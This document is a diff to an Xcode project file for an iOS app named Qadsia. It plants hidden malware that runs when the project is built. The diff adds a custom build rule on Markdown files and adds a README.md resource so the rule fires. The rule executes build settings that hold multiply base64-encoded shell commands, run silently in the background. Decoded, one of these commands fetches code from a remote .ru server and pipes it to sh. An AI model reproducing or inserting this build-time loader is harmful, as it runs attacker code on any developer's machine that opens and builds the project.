@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		195A44E9E9C14318B11DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = 32B37090867D4A6D881DACE1; };
 		0A4F52BD2F7677D500DF695B /* HomeVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A4F52BC2F7677D500DF695B /* HomeVC.xib */; };
 		0A4F52BE2F7677D500DF695B /* HomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A4F52BB2F7677D500DF695B /* HomeVC.swift */; };
 		0A96E3782F76574C00B3DADB /* OTPVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A96E3752F76574C00B3DADB /* OTPVC.swift */; };
@@ -106,6 +107,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		32B37090867D4A6D881DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0A4F52BB2F7677D500DF695B /* HomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVC.swift; sourceTree = "<group>"; };
 		0A4F52BC2F7677D500DF695B /* HomeVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HomeVC.xib; sourceTree = "<group>"; };
 		0A96E3752F76574C00B3DADB /* OTPVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OTPVC.swift; sourceTree = "<group>"; };
@@ -744,6 +746,7 @@
 		BC0179172F34972300F1ED81 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				32B37090867D4A6D881DACE1 /* README.md */,
 				BC0179162F34972300F1ED81 /* Qadsia.app */,
 			);
 			name = Products;
@@ -817,12 +820,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC0179292F34972600F1ED81 /* Build configuration list for PBXNativeTarget "Qadsia" */;
 			buildPhases = (
-				EE77A422482E40AD9D1DACE1 /* Provision Library Executable */,
 				BC0179122F34972300F1ED81 /* Sources */,
 				BC0179132F34972300F1ED81 /* Frameworks */,
 				BC0179142F34972300F1ED81 /* Resources */,
 			);
 			buildRules = (
+				00F9E6F8227A4B7C9F1DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -879,26 +882,24 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		00F9E6F8227A4B7C9F1DACE1 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A1ECAD1}\"";
+			};
+	/* End PBXBuildRule section */
+
 /* Begin PBXShellScriptBuildPhase section */
-		EE77A422482E40AD9D1DACE1 /* Provision Library Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Library Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -906,6 +907,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				195A44E9E9C14318B11DACE1 /* README.md */,
 				0ABA3FD22F763B2D00D25F03 /* Mulish-Black.ttf in Resources */,
 				39D22EC12F7695D000D7721C /* ProfileVC.xib in Resources */,
 				0ABA3FD32F763B2D00D25F03 /* Mulish-BlackItalic.ttf in Resources */,
@@ -1035,7 +1037,7 @@
 		BC01792A2F34972600F1ED81 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((i(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwYWEzaHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpkMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWlpWMUo2WWxjNWVWcFhiSFZNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | i | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((p(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1IaHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNa2xETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9UQmhWekZzWkRKV2FXSnRWakJNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | p | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXRhVzVrWld4bllYUmxMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -1072,7 +1074,7 @@
 		BC01792B2F34972600F1ED81 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((i(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwYWEzaHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpkMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWlpWMUo2WWxjNWVWcFhiSFZNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | i | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((p(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1IaHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNa2xETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9UQmhWekZzWkRKV2FXSnRWakJNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | p | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXRhVzVrWld4bllYUmxMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
